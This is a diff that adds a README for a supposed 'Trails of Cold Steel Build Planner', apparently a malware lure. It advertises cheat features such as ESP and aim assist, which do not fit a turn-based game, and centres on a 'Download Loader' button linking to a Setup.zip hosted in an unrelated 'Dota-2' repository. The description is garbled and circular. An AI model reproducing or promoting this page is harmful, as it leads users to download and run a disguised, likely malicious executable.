@@ -1,2 +1,40 @@
-# Trails-of-Cold-Steel-Build-Planner
-{title} is a feature-rich third-party modification project for {Trails of Cold Steel Build Planner}.
+<div align="center">
+
+# 🎮 Trails of Cold Steel Build Planner
+
+> ⚡ Advanced Game Modification Project for Trails of Cold Steel Build Planner
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+Trails of Cold Steel Build Planner is a feature-rich third-party modification project for Trails of Cold Steel Build Planner.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`Trails-of-Cold-Steel-Build-Planner` · Updated: 2026-10-05
+
+**Tags:** `trails-of-cold-steel` `build-planner` `jrpg` `turn-based-rpg` `characters`
